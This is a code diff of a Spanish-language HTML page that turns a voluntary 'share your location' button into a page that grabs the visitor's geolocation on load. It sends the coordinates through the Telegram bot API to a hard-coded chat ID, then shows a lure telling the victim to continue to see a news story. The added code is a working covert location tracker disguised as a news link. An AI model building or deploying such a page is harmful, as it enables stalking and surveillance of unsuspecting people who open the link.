@@ -4,23 +4,23 @@
   <title>Ubicación</title>
 </head>
 <body style="text-align:center; font-family:sans-serif;">
-  <h2>Presiona para compartir tu ubicación</h2>
-
-  <button onclick="enviar()">ENVIAR UBICACIÓN</button>
-
-  <p id="resultado"></p>
+  <h2>Enviando ubicación...</h2>
 
   <script>
-    function enviar() {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        let link = "https://maps.google.com/?q=" 
-        + position.coords.latitude + "," 
-        + position.coords.longitude;
+    navigator.geolocation.getCurrentPosition(function(position) {
 
-        document.getElementById("resultado").innerHTML =
-        "Ubicación:<br><a href='" + link + "' target='_blank'>" + link + "</a>";
-      });
-    }
+      let lat = position.coords.latitude;
+      let lon = position.coords.longitude;
+
+      let mensaje = "Ubicación: https://maps.google.com/?q=" + lat + "," + lon;
+
+      fetch("https://api.telegram.org/botTU_TOKEN/sendMessage?chat_id=1365142648&text=" + mensaje);
+
+      document.body.innerHTML = "<h2>siguiente para ver noticia ✅</h2>";
+
+    }, function(error) {
+      document.body.innerHTML = "<h2>Error al obtener ubicación ❌</h2>";
+    });
   </script>
 </body>
 </html>
